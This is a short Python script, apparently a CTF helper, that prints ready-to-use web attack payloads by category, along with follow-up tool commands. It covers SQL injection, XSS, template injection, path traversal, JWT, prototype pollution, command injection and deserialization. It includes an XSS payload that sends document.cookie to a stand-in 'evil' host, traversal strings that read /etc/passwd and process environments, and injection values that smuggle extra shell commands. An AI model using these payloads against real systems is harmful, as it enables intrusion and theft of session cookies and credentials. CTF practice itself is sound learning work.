#!/usr/bin/env python3
"""CTF-Solver Pro — generate payloads for web CTF challenges.

Usage:
  python3 ctf_solver.py --type sqli
  python3 ctf_solver.py --url http://ctf/chal --type ssti
Prints ready-to-use payloads + next-step commands. No network by default.
"""
import argparse

PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' UNION SELECT 1,2,3-- -",
        "1' AND SLEEP(5)-- -", "1 AND 1=CAST(1 AS INT)-- -",
        "' OR 1=1#", "admin'-- -",
    ],
    "xss": [
        "<svg/onload=alert(1)>", "<script>fetch('//evil/?c='+document.cookie)</script>",
        "\"><img src=x onerror=alert(1)>", "javascript:alert(1)",
        "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
    ],
    "ssti": [
        "{{7*7}}", "{{config.items()}}", "{{self._TemplateReference__context.cycles.__init__.__globals__}}",
        "{%debug%}", "{{request.application.__globals__.__builtins__}}",
    ],
    "traversal": [
        "../../../../etc/passwd", "....//....//etc/passwd", "..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd", "/proc/self/environ",
    ],
    "jwt": [
        "# alg:none attack\npython3 -m jwt_tool <token> -X a",
        "# weak secret\npython3 -m jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt",
    ],
    "protopoll": [
        '{"__proto__":{"polluted":"yes"}}',
        '{"constructor":{"prototype":{"polluted":"yes"}}}',
    ],
    "cmdi": [
        "; id", "| id", "$(id)", "`id`", ";cat /flag", "${IFS}cat${IFS}/flag",
    ],
    "deser": [
        "# PHP: phpggc Monolog RCE", "# Python: pickle.loads(controlled)",
        "# Java: ysoserial CommonsCollections",
    ],
}

NEXT = {
    "sqli": "sqlmap -u <url> --dbs --batch",
    "xss": "manual browser test or dalfox url <url>",
    "ssti": "probe {{7*7}} then escalate to RCE",
    "traversal": "try wrappers php://, expect LFI->RCE via log poison",
    "jwt": "jwt_tool for alg-none / weak secret",
    "protopoll": "chain with client-side sink",
    "cmdi": "confirm with ;id then read /flag",
    "deser": "use ysoserial/phpggc for gadget chain",
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--type", required=True, choices=PAYLOADS.keys())
    ap.add_argument("--url", default="")
    a = ap.parse_args()

    print(f"# CTF-Solver Pro — type={a.type}")
    if a.url:
        print(f"# target={a.url}")
    print("\n## Payloads")
    for p in PAYLOADS[a.type]:
        print(f"  {p}")
    print(f"\n## Next step\n  {NEXT[a.type]}")


if __name__ == "__main__":
    main()
